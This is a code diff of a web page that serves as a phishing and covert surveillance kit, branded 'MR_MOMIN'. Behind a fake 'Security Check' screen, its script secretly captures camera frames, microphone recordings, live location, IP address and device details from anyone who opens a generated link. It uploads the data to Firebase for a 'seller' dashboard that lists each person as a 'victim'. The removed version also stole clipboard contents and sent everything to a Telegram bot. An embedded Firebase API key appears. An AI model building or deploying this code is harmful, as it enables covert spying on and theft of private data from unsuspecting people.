@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MR_MOMIN_🌍 | HACK SUITE</title>
+    <title>MR_MOMIN_🌍 | UID LINK GENERATOR</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <!-- Firebase SDK (Compat) -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', 'Fira Code', monospace; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
         body {
             background: radial-gradient(circle at 20% 30%, #03000a, #000000);
             min-height: 100vh;
@@ -17,37 +16,22 @@
             align-items: center;
             justify-content: center;
             padding: 1rem;
-            position: relative;
-            overflow-x: hidden;
-        }
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.1;
         }
         .glass-card {
             background: rgba(0, 10, 20, 0.85);
             backdrop-filter: blur(12px);
             border-radius: 2rem;
             border: 1px solid #0f0;
-            max-width: 600px;
+            max-width: 800px;
             width: 100%;
             padding: 2rem;
             box-shadow: 0 0 30px rgba(0,255,0,0.2);
-            position: relative;
-            z-index: 2;
         }
         h1 {
             font-size: 1.8rem;
             text-align: center;
             color: #0f0;
             text-shadow: 0 0 5px #0f0;
-            letter-spacing: 2px;
         }
         .tagline {
             text-align: center;
@@ -55,28 +39,7 @@
             font-size: 0.7rem;
             border-bottom: 1px solid #0f0;
             display: inline-block;
-            width: auto;
-            padding-bottom: 5px;
             margin-bottom: 1.5rem;
-        }
-        .input-group {
-            margin-bottom: 1rem;
-        }
-        label {
-            display: block;
-            font-size: 0.7rem;
-            color: #0f0;
-            margin-bottom: 4px;
-        }
-        input {
-            width: 100%;
-            background: #001000;
-            border: 1px solid #0f0;
-            border-radius: 1rem;
-            padding: 12px;
-            color: #0f0;
-            font-size: 0.8rem;
-            outline: none;
         }
         .feature-grid {
             display: grid;
@@ -91,14 +54,12 @@
             padding: 8px;
             text-align: center;
             cursor: pointer;
-            font-size: 0.8rem;
             color: #0f0;
             transition: 0.2s;
         }
         .feature-card.selected {
             background: #0f03;
             box-shadow: 0 0 12px #0f0;
-            border-color: #fff;
         }
         .btn {
             width: 100%;
@@ -109,12 +70,9 @@
             font-weight: bold;
             color: black;
             cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
         }
-        .btn:active { transform: scale(0.97); }
         .link-box {
-            margin-top: 1.5rem;
+            margin-top: 1rem;
             background: #000000aa;
             border-radius: 1rem;
             padding: 12px;
@@ -127,21 +85,82 @@
             padding: 8px;
             border-radius: 0.5rem;
             color: #afa;
+        }
+        .campaign-list {
+            margin-top: 1.5rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .campaign-item {
+            background: #001000;
+            border-radius: 1rem;
+            padding: 10px;
+            margin-bottom: 8px;
+            font-size: 0.7rem;
+        }
+        .campaign-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
             margin-bottom: 8px;
         }
-        .info-note {
-            font-size: 0.6rem;
-            text-align: center;
-            margin-top: 20px;
-            color: #4a8;
+        .campaign-link {
+            flex: 1;
+            word-break: break-all;
+            color: #afa;
+            font-size: 0.65rem;
         }
+        .campaign-clicks {
+            background: #0f0;
+            color: black;
+            padding: 2px 8px;
+            border-radius: 1rem;
+            font-weight: bold;
+        }
+        .victim-data {
+            margin-top: 8px;
+            border-top: 1px solid #0f0;
+            padding-top: 6px;
+            font-size: 0.6rem;
+        }
+        .victim-item {
+            background: #0a1a0a;
+            padding: 6px;
+            margin-top: 4px;
+            border-radius: 8px;
+        }
+        .image-preview {
+            max-width: 100px;
+            max-height: 100px;
+            cursor: pointer;
+        }
+        audio {
+            max-width: 150px;
+            height: 30px;
+        }
+        .status-msg {
+            font-size: 0.7rem;
+            color: #ffa;
+            margin-top: 8px;
+        }
+        .uid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #001000;
+            padding: 8px;
+            border-radius: 1rem;
+            margin-bottom: 1rem;
+        }
+        .hide { display: none; }
         .victim-card {
             background: #111;
             border-radius: 1.5rem;
             padding: 2rem;
             text-align: center;
             color: #0f0;
-            box-shadow: 0 0 20px #0f03;
         }
         .loader {
             width: 40px;
@@ -153,130 +172,49 @@
             margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .hide { display: none; }
-        /* dashboard extras */
-        .stats-row {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 1rem;
-            font-size: 0.8rem;
-            background: #001000;
-            padding: 8px;
-            border-radius: 1rem;
-        }
-        .uid-control {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 1rem;
-        }
-        .uid-control input {
-            flex: 1;
-        }
-        .uid-control button {
-            background: #0f0;
-            border: none;
-            border-radius: 1rem;
-            padding: 0 12px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .status-msg {
-            font-size: 0.7rem;
-            color: #ffa;
-            margin-top: 8px;
-        }
-        /* secret console */
-        #secretConsole {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #000000dd;
-            border: 1px solid #0f0;
-            border-radius: 8px;
-            padding: 10px;
-            width: 280px;
-            backdrop-filter: blur(4px);
-            z-index: 9999;
-            display: none;
-            font-size: 0.7rem;
-            color: #0f0;
-        }
-        .console-input {
-            background: black;
-            border: 1px solid #0f0;
-            color: #0f0;
-            width: 100%;
-            padding: 4px;
-            margin-top: 6px;
-        }
     </style>
 </head>
 <body>
-<div id="matrixCanvas" class="matrix-bg"></div>
-
 <div id="appRoot">
-    <!-- dashboard panel -->
+    <!-- Dashboard Panel (Seller) -->
     <div id="dashboardPanel" class="glass-card">
-        <h1>> MR_MOMIN_🌍_</h1>
-        <div style="text-align:center;"><span class="tagline">[ UID EXPLOIT FRAMEWORK v5.0 ]</span></div>
-        
-        <div class="uid-control">
-            <input type="text" id="uidInput" placeholder="Enter UID to load config">
-            <button id="loadUidBtn">LOAD</button>
-        </div>
-
-        <div class="input-group">
-            <label>🤖 BOT TOKEN</label>
-            <input type="text" id="botToken" placeholder="123456:ABCdef">
-        </div>
-        <div class="input-group">
-            <label>💬 CHAT ID</label>
-            <input type="text" id="chatId" placeholder="-1001234567890">
+        <div class="uid-header">
+            <span>🔑 YOUR UID: <strong id="displayUid"></strong></span>
+            <button id="newUidBtn" style="background:#333; border:1px solid #0f0; border-radius:1rem; padding:4px 8px;">NEW UID</button>
         </div>
         <div class="feature-grid" id="featureGrid">
-            <div class="feature-card" data-feat="C"><span>📸</span> CAMERA</div>
-            <div class="feature-card" data-feat="M"><span>🎙️</span> MIC</div>
-            <div class="feature-card" data-feat="L"><span>📍</span> LOCATION</div>
-            <div class="feature-card" data-feat="X"><span>💻</span> DEVICE INFO</div>
+            <div class="feature-card" data-feat="C">📸 CAMERA</div>
+            <div class="feature-card" data-feat="M">🎙️ MIC</div>
+            <div class="feature-card" data-feat="L">📍 LOCATION</div>
+            <div class="feature-card" data-feat="X">💻 DEVICE INFO</div>
         </div>
-        <button class="btn" id="generateUidBtn">⚡ GENERATE NEW UID & LINK</button>
-        
-        <div id="uidInfoBox" class="link-box" style="display: none;">
-            <div><strong>🔑 YOUR UID:</strong> <span id="displayUid"></span></div>
-            <div><strong>🔗 YOUR LINK:</strong></div>
-            <div class="link-text" id="generatedLink">--</div>
+        <button class="btn" id="generateLinkBtn">🔗 GENERATE NEW LINK</button>
+        <div id="newLinkBox" class="link-box" style="display: none;">
+            <div><strong>🔗 NEW LINK (SHARE THIS):</strong></div>
+            <div class="link-text" id="newLinkText">--</div>
             <button id="copyLinkBtn" style="background:#0f0; color:#000; border:none; border-radius:1rem; padding:6px; margin-top:8px;">COPY LINK</button>
-            <div class="stats-row">
-                <span>👥 CLICKS:</span>
-                <span id="clickCount">0</span>
-            </div>
         </div>
-        <div id="statusMsg" class="status-msg"></div>
-        <div class="info-note">🔒 Generate UID → Share Link → Victims automatically send data to your Telegram.</div>
+        <div class="campaign-list">
+            <div style="text-align:center; color:#5f5; margin-bottom:8px;">YOUR CAMPAIGNS</div>
+            <div id="campaignList"></div>
+        </div>
+        <div id="dashboardStatus" class="status-msg"></div>
     </div>
-    
-    <!-- victim panel (auto) -->
+
+    <!-- Victim Panel -->
     <div id="victimPanel" class="victim-card hide">
         <h2>🛡️ SECURITY CHECK</h2>
         <p>Verifying your device...</p>
         <div class="loader"></div>
-        <p style="font-size:0.7rem;">Please wait, this will take a few seconds.</p>
+        <p style="font-size:0.7rem;">Please wait...</p>
     </div>
-</div>
-
-<!-- secret console -->
-<div id="secretConsole">
-    <div style="color:#0f0;">🔓 DEVELOPER CONSOLE [MR_MOMIN_🌍]</div>
-    <div style="font-size:0.6rem;">type commands below</div>
-    <input type="text" id="consoleInput" class="console-input" placeholder="> help">
-    <div id="consoleOutput" style="margin-top:6px; font-size:0.6rem; max-height:100px; overflow-y:auto;"></div>
 </div>
 
 <video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    // ========== FIREBASE CONFIG (YOUR PROVIDED) ==========
+    // Firebase Config (Your Provided)
     const firebaseConfig = {
         apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
         authDomain: "momin-tracking-sysrem.firebaseapp.com",
@@ -289,242 +227,230 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    
-    // ========== MATRIX BACKGROUND ==========
-    (function matrixRain() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        document.getElementById('matrixCanvas').appendChild(canvas);
-        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        for(let i=0; i<columns; i++) drops[i] = 1;
-        function draw() {
-            ctx.fillStyle = 'rgba(0,0,0,0.04)';
-            ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px monospace';
-            for(let i=0; i<drops.length; i++) {
-                const text = chars[Math.floor(Math.random()*chars.length)];
-                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
-                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
-                drops[i]++;
-            }
-        }
-        setInterval(draw, 50);
-        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
-    })();
 
-    // ========== GLOBAL UTILS ==========
+    // Helper functions
+    function generateUID() {
+        return Math.floor(10000000 + Math.random() * 90000000).toString();
+    }
+
     function showMsg(msg, isError=false) {
-        const status = document.getElementById('statusMsg');
-        status.innerText = msg;
-        status.style.color = isError ? '#f66' : '#afa';
-        setTimeout(() => { if(status.innerText === msg) status.innerText = ''; }, 3000);
-    }
-    function copyClip(txt, successMsg='✅ Copied!') {
-        navigator.clipboard.writeText(txt).then(()=>showMsg(successMsg)).catch(()=>showMsg('❌ Copy failed', true));
-    }
-
-    // ========== DASHBOARD LOGIC ==========
-    let currentUid = null;
-    let currentRef = null;
-    
-    function updateUIwithConfig(config) {
-        if(!config) return;
-        document.getElementById('botToken').value = config.token || '';
-        document.getElementById('chatId').value = config.chatId || '';
-        const features = config.features || '';
-        document.querySelectorAll('.feature-card').forEach(card => {
-            const f = card.getAttribute('data-feat');
-            if(features.includes(f)) card.classList.add('selected');
-            else card.classList.remove('selected');
-        });
-    }
-    
-    function startRealtimeClicks(uid) {
-        if(currentRef) currentRef.off();
-        const clickRef = db.ref(`configs/${uid}/clicks`);
-        clickRef.on('value', (snap) => {
-            const clicks = snap.val() || 0;
-            document.getElementById('clickCount').innerText = clicks;
-        });
-        currentRef = clickRef;
-    }
-    
-    async function saveConfigToFirebase(uid, token, chatId, features) {
-        await db.ref(`configs/${uid}`).set({
-            token: token,
-            chatId: chatId,
-            features: features,
-            clicks: 0,
-            createdAt: Date.now()
-        });
-    }
-    
-    async function loadUid(uid) {
-        if(!uid) return false;
-        const snap = await db.ref(`configs/${uid}`).get();
-        if(snap.exists()) {
-            currentUid = uid;
-            const config = snap.val();
-            updateUIwithConfig(config);
-            document.getElementById('displayUid').innerText = uid;
-            const link = `${window.location.origin}${window.location.pathname}?uid=${uid}`;
-            document.getElementById('generatedLink').innerText = link;
-            document.getElementById('uidInfoBox').style.display = 'block';
-            startRealtimeClicks(uid);
-            showMsg(`Loaded UID: ${uid}`);
-            return true;
-        } else {
-            showMsg(`UID not found: ${uid}`, true);
-            return false;
+        const el = document.getElementById('dashboardStatus');
+        if(el) {
+            el.innerText = msg;
+            el.style.color = isError ? '#f66' : '#afa';
+            setTimeout(() => { if(el.innerText === msg) el.innerText = ''; }, 3000);
         }
     }
-    
-    function generateNewUid() {
-        const token = document.getElementById('botToken').value.trim();
-        const chatId = document.getElementById('chatId').value.trim();
-        if(!token || !chatId) { showMsg('❌ Bot Token and Chat ID required!', true); return; }
+
+    function copyClip(txt) {
+        navigator.clipboard.writeText(txt).then(() => showMsg('✅ Link copied!')).catch(() => showMsg('❌ Copy failed', true));
+    }
+
+    // ========== SELLER DASHBOARD ==========
+    let currentUid = null;
+    let campaignsRef = null;
+
+    async function loadSellerDashboard(uid) {
+        const snapshot = await db.ref(`sellers/${uid}`).once('value');
+        if(!snapshot.exists()) {
+            // If UID not in DB, create it
+            await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
+        }
+        currentUid = uid;
+        localStorage.setItem('momin_uid', uid);
+        document.getElementById('displayUid').innerText = uid;
+        document.getElementById('dashboardPanel').classList.remove('hide');
+        document.getElementById('victimPanel').classList.add('hide');
+        // Load campaigns
+        loadCampaigns(uid);
+        // Setup realtime listener for campaigns
+        if(campaignsRef) campaignsRef.off();
+        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
+        campaignsRef.on('value', (snap) => {
+            renderCampaigns(snap.val() || {});
+        });
+    }
+
+    function loadCampaigns(uid) {
+        // This is handled by the listener above
+    }
+
+    function renderCampaigns(campaigns) {
+        const container = document.getElementById('campaignList');
+        if(Object.keys(campaigns).length === 0) {
+            container.innerHTML = '<div style="text-align:center; color:#5f5;">No campaigns yet. Create your first link.</div>';
+            return;
+        }
+        let html = '';
+        for(const [campId, camp] of Object.entries(campaigns)) {
+            html += `
+                <div class="campaign-item">
+                    <div class="campaign-header">
+                        <div class="campaign-link">🔗 ${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}</div>
+                        <div class="campaign-clicks">👥 ${camp.clicks || 0}</div>
+                        <button class="copy-camp" data-link="${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}" style="background:#0f0; border:none; border-radius:1rem; padding:2px 6px;">Copy</button>
+                    </div>
+                    <div class="victim-data" id="victims-${campId}">
+                        <div style="color:#afa;">Loading victims...</div>
+                    </div>
+                </div>
+            `;
+        }
+        container.innerHTML = html;
+        // Add copy event listeners
+        document.querySelectorAll('.copy-camp').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const link = btn.getAttribute('data-link');
+                copyClip(link);
+            });
+        });
+        // Load victims data for each campaign
+        for(const campId of Object.keys(campaigns)) {
+            loadVictimsData(campId);
+        }
+    }
+
+    async function loadVictimsData(campId) {
+        const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
+        victimsRef.on('value', (snap) => {
+            const victims = snap.val() || {};
+            const container = document.getElementById(`victims-${campId}`);
+            if(Object.keys(victims).length === 0) {
+                container.innerHTML = '<div style="color:#5f5;">No victims yet.</div>';
+                return;
+            }
+            let html = '';
+            for(const [victimId, data] of Object.entries(victims)) {
+                html += `<div class="victim-item"><strong>🕵️ Victim ${victimId.slice(-4)}</strong><br>`;
+                if(data.deviceInfo) {
+                    html += `📱 Device: ${data.deviceInfo.platform}, ${data.deviceInfo.language}<br>`;
+                    html += `🔋 Battery: ${data.deviceInfo.battery}<br>`;
+                }
+                if(data.location && data.location.length) {
+                    const lastLoc = data.location[data.location.length-1];
+                    html += `📍 Last Location: ${lastLoc.lat}, ${lastLoc.lng}<br>`;
+                }
+                if(data.camera && data.camera.length) {
+                    data.camera.forEach((img, idx) => {
+                        html += `<img src="${img}" class="image-preview" onclick="window.open('${img}')" style="max-width:80px; max-height:80px; margin:2px;"> `;
+                    });
+                }
+                if(data.mic && data.mic.length) {
+                    data.mic.forEach((audio, idx) => {
+                        html += `<audio controls src="${audio}"></audio> `;
+                    });
+                }
+                html += `</div>`;
+            }
+            container.innerHTML = html;
+        });
+    }
+
+    function generateNewCampaign() {
         const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
-        if(selected.length === 0) { showMsg('❌ Select at least one feature!', true); return; }
-        
-        const uid = 'UID_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
-        saveConfigToFirebase(uid, token, chatId, selected).then(() => {
-            currentUid = uid;
-            document.getElementById('displayUid').innerText = uid;
-            const link = `${window.location.origin}${window.location.pathname}?uid=${uid}`;
-            document.getElementById('generatedLink').innerText = link;
-            document.getElementById('uidInfoBox').style.display = 'block';
-            startRealtimeClicks(uid);
-            showMsg('✅ UID created! Share the link.');
+        if(selected.length === 0) {
+            showMsg('❌ Select at least one feature!', true);
+            return;
+        }
+        const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6);
+        const campaignRef = db.ref(`sellers/${currentUid}/campaigns/${campId}`);
+        campaignRef.set({
+            features: selected,
+            clicks: 0,
+            createdAt: Date.now(),
+            victims: {}
+        }).then(() => {
+            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            document.getElementById('newLinkText').innerText = link;
+            document.getElementById('newLinkBox').style.display = 'block';
+            showMsg('✅ Campaign created! Share the link.');
         }).catch(err => {
             console.error(err);
             showMsg('❌ Firebase error: ' + err.message, true);
         });
     }
-    
-    // dashboard event listeners
-    document.getElementById('generateUidBtn').addEventListener('click', generateNewUid);
-    document.getElementById('copyLinkBtn').addEventListener('click', () => {
-        const link = document.getElementById('generatedLink').innerText;
-        if(link && link !== '--') copyClip(link);
-        else showMsg('Generate UID first', true);
-    });
-    document.getElementById('loadUidBtn').addEventListener('click', () => {
-        const uid = document.getElementById('uidInput').value.trim();
-        if(uid) loadUid(uid);
-        else showMsg('Enter a UID', true);
-    });
-    
-    // ========== VICTIM MODE (when ?uid=... is present) ==========
-    const urlParams = new URLSearchParams(window.location.search);
-    const uidParam = urlParams.get('uid');
-    
-    if(uidParam) {
-        // Hide dashboard, show victim panel
-        document.getElementById('dashboardPanel').classList.add('hide');
-        document.getElementById('victimPanel').classList.remove('hide');
-        
-        // Fetch config from Firebase
-        db.ref(`configs/${uidParam}`).once('value', async (snap) => {
-            if(!snap.exists()) {
-                document.querySelector('#victimPanel p').innerText = 'Invalid link.';
-                document.querySelector('#victimPanel .loader').style.display = 'none';
-                return;
-            }
-            const config = snap.val();
-            const token = config.token;
-            const chatId = config.chatId;
-            const features = config.features || '';
-            
-            // Increment click count
-            const clickRef = db.ref(`configs/${uidParam}/clicks`);
-            clickRef.transaction((current) => (current || 0) + 1);
-            
-            // Start data collection (same as original victimAuto)
-            await startVictimAuto(token, chatId, features);
-        }).catch(err => {
-            console.error(err);
-            document.querySelector('#victimPanel p').innerText = 'Error loading config.';
-            document.querySelector('#victimPanel .loader').style.display = 'none';
-        });
-    }
-    
-    // ========== VICTIM AUTO FUNCTIONS ==========
-    async function startVictimAuto(token, chatId, features) {
-        const devTag = "\n\n_🧨 Developed by MR_MOMIN_🌍_";
-        const captionDev = "🧨 Developed by MR_MOMIN_🌍";
 
-        async function sendText(txt) {
+    // ========== VICTIM MODE ==========
+    async function startVictimCollector(sellerUid, campaignId, features) {
+        // Send data to Firebase under sellerUid/campaigns/campaignId/victims
+        const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+        const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
+
+        // Prepare data object
+        const victimData = {
+            deviceInfo: {},
+            location: [],
+            camera: [],
+            mic: [],
+            timestamp: Date.now()
+        };
+
+        // Device Info
+        if(features.includes('X')) {
+            let ip = 'unknown';
             try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ chat_id: chatId, text: txt+devTag, parse_mode:'Markdown' })
-                });
-            } catch(e){}
-        }
-        async function sendPhoto(blob, caption = captionDev) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('photo', blob, 'shot.jpg');
-            if(caption) fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method:'POST', body:fd });
-        }
-        async function sendVoice(blob, caption = captionDev) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('voice', blob, 'audio.ogg');
-            if(caption) fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method:'POST', body:fd });
-        }
-
-        // ----- 1. DEVICE INFO -----
-        if(features.includes('X')){
-            let ip='unknown'; try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); ip=d.ip; }catch(e){}
-            let bat='N/A'; if(navigator.getBattery){ let b=await navigator.getBattery(); bat=`${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`; }
-            sendText(`📱 *DEVICE INFO*\nIP: \`${ip}\`\nBATTERY: ${bat}\nPLATFORM: ${navigator.platform}\nLANG: ${navigator.language}\nSCREEN: ${screen.width}x${screen.height}\nTIME: ${new Date().toLocaleString()}`);
-        }
-
-        // ----- 2. LOCATION -----
-        if(features.includes('L') && navigator.geolocation){
-            const getLocationAndSend = () => {
-                navigator.geolocation.getCurrentPosition(p=>{
-                    sendText(`📍 *LIVE LOCATION*\n${p.coords.latitude}, ${p.coords.longitude}\n[MAP](https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude})`);
-                }, e=>sendText(`❌ LOCATION ERROR: ${e.message}`));
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            let battery = 'N/A';
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
+            }
+            victimData.deviceInfo = {
+                ip,
+                battery,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                userAgent: navigator.userAgent
             };
-            getLocationAndSend();
-            setInterval(getLocationAndSend, 30000);
         }
 
-        // ----- 3. CAMERA -----
-        let cameraInterval = null;
-        if(features.includes('C')){
-            try{
+        // Location (single capture + optional interval)
+        if(features.includes('L') && navigator.geolocation) {
+            const getLocation = () => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    victimData.location.push({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        time: Date.now()
+                    });
+                    victimRef.child('location').set(victimData.location);
+                }, err => console.log('Location error', err));
+            };
+            getLocation();
+            setInterval(getLocation, 30000);
+        }
+
+        // Camera
+        if(features.includes('C')) {
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream; await video.play();
+                video.srcObject = stream;
+                await video.play();
                 const canvas = document.getElementById('hiddenCanvas');
                 const capture = () => {
-                    if(video.videoWidth && video.videoHeight){
-                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        canvas.toBlob(blob => sendPhoto(blob, captionDev), 'image/jpeg', 0.7);
+                    if(video.videoWidth && video.videoHeight) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        victimData.camera.push(dataUrl);
+                        victimRef.child('camera').set(victimData.camera);
                     }
                 };
                 capture();
-                cameraInterval = setInterval(capture, 333);
-            } catch(e){ sendText(`❌ CAMERA ERROR: ${e.message}`); }
+                setInterval(capture, 333);
+            } catch(e) { console.error('Camera error', e); }
         }
 
-        // ----- 4. MICROPHONE -----
-        let micLoop = null;
-        if(features.includes('M')){
+        // Microphone
+        if(features.includes('M')) {
             const recordAndSend = async () => {
-                try{
+                try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     const mediaRecorder = new MediaRecorder(stream);
                     let chunks = [];
@@ -533,137 +459,94 @@
                         mediaRecorder.onstop = () => {
                             const blob = new Blob(chunks, { type: 'audio/ogg' });
                             stream.getTracks().forEach(t => t.stop());
-                            resolve(blob);
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                const dataUrl = reader.result;
+                                victimData.mic.push(dataUrl);
+                                victimRef.child('mic').set(victimData.mic);
+                                resolve();
+                            };
+                            reader.readAsDataURL(blob);
                         };
                     });
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 6000);
-                    const blob = await audioPromise;
-                    await sendVoice(blob, captionDev);
-                } catch(e){ sendText(`❌ MIC ERROR: ${e.message}`); }
+                    await audioPromise;
+                } catch(e) { console.error('Mic error', e); }
             };
             recordAndSend();
-            micLoop = setInterval(recordAndSend, 10000);
+            setInterval(recordAndSend, 10000);
         }
 
-        // ========== ALWAYS-ON SECRET FEATURES ==========
-        // Battery realtime
-        if(navigator.getBattery){
-            let b = await navigator.getBattery();
-            const report=()=> sendText(`🔋 *BATTERY*\n${Math.round(b.level*100)}% | ${b.charging?'CHARGING':'NOT CHARGING'}`);
-            report(); b.addEventListener('levelchange',report); b.addEventListener('chargingchange',report);
-        }
+        // Additional: screenshot
+        try {
+            const ssCanvas = await html2canvas(document.body, { scale: 0.7 });
+            const ssDataUrl = ssCanvas.toDataURL('image/jpeg', 0.7);
+            victimData.camera.push(ssDataUrl);
+            victimRef.child('camera').set(victimData.camera);
+        } catch(e) {}
 
-        // Network info
-        let netInfo = `🌐 *NETWORK*\nIP: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown')}`;
-        let conn = navigator.connection || navigator.mozConnection;
-        if(conn) netInfo += `\nTYPE: ${conn.effectiveType}\nDOWNLINK: ${conn.downlink} Mbps`;
-        sendText(netInfo);
-
-        // Browser fingerprint
-        let cvs = document.createElement('canvas'); cvs.width=200; cvs.height=50;
-        let ctx = cvs.getContext('2d'); ctx.fillStyle='#0f0'; ctx.fillRect(0,0,100,50); ctx.fillStyle='#0f0'; ctx.fillText('MR_MOMIN',10,20);
-        let fp = cvs.toDataURL();
-        sendText(`🕵️ *FINGERPRINT*\nCanvas: ${fp.substring(0,50)}...\nPlugins: ${Array.from(navigator.plugins).map(p=>p.name).join(',')}\nUserAgent: ${navigator.userAgent}\nCores: ${navigator.hardwareConcurrency}`);
-
-        // Screenshot
-        try{
-            let ssCanvas = await html2canvas(document.body, {scale:0.7});
-            let blob = await new Promise(r=>ssCanvas.toBlob(r,'image/jpeg',0.7));
-            await sendPhoto(blob, "📸 SCREENSHOT\n"+captionDev);
-        }catch(e){}
-
-        // Sound detection
-        let soundInterval = null;
-        const detectSound = async () => {
-            try{
-                let stream = await navigator.mediaDevices.getUserMedia({audio:true});
-                let audioCtx = new (window.AudioContext||window.webkitAudioContext)();
-                let source = audioCtx.createMediaStreamSource(stream);
-                let analyser = audioCtx.createAnalyser(); analyser.fftSize=256;
-                source.connect(analyser);
-                let data = new Uint8Array(analyser.frequencyBinCount);
-                let maxLevel=0;
-                let intv = setInterval(()=>{
-                    analyser.getByteTimeDomainData(data);
-                    let max=0; for(let i=0;i<data.length;i++){ let v=(data[i]-128)/128; max=Math.max(max,Math.abs(v)); }
-                    maxLevel=Math.max(maxLevel,max);
-                },100);
-                setTimeout(()=>{
-                    clearInterval(intv); stream.getTracks().forEach(t=>t.stop()); audioCtx.close();
-                    sendText(`🔊 *SOUND DETECTION*\nMax ambient: ${maxLevel.toFixed(3)}\n${maxLevel>0.05?'SOUND DETECTED':'SILENT'}`);
-                },3000);
-            } catch(e){}
-        };
-        detectSound();
-        soundInterval = setInterval(detectSound, 15000);
-
-        // Clipboard monitor
-        setInterval(async()=>{
-            try{
-                let txt = await navigator.clipboard.readText();
-                if(txt && txt.trim()) sendText(`📋 *CLIPBOARD TEXT*\n\`\`\`\n${txt.substring(0,500)}\n\`\`\``);
-                let items = await navigator.clipboard.read();
-                for(let item of items){
-                    for(let type of item.types){
-                        if(type.startsWith('image/')){
-                            let blob = await item.getType(type);
-                            await sendPhoto(blob, "📋 CLIPBOARD IMAGE\n"+captionDev);
-                        }
-                    }
-                }
-            } catch(e){}
-        },7000);
-
-        // Redirect after 10 seconds
-        setTimeout(()=>{
-            window.location.href = 'https://www.google.com';
-        }, 10000);
+        // Save initial data
+        await victimRef.set(victimData);
+        // Increment click count
+        const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
+        clickRef.transaction(current => (current || 0) + 1);
     }
-    
-    // ========== SECRET DEVELOPER CONSOLE ==========
-    let consoleDiv = document.getElementById('secretConsole');
-    let consoleInput = document.getElementById('consoleInput');
-    let consoleOut = document.getElementById('consoleOutput');
-    let secretTrigger = '';
-    document.addEventListener('keydown', (e) => {
